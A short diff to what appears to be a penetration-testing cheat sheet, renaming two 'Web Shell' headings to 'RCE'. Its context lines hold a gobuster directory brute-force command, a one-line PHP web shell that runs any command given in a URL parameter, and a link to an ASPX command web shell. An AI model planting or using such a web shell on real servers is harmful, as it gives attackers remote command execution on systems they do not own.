@@ -32,12 +32,12 @@ gobuster dir -e -u http://Domain-or-IP/ -w /usr/share/wordlists/dirbuster/direct
 ```
 ## Reverse Shell
 
-Web Shell PHP
+RCE PHP
 ```
 <?php system($_GET[cmd]);?>
 ```
 
-Web Shell .aspx
+RCE .aspx
 ```
 https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
 ```
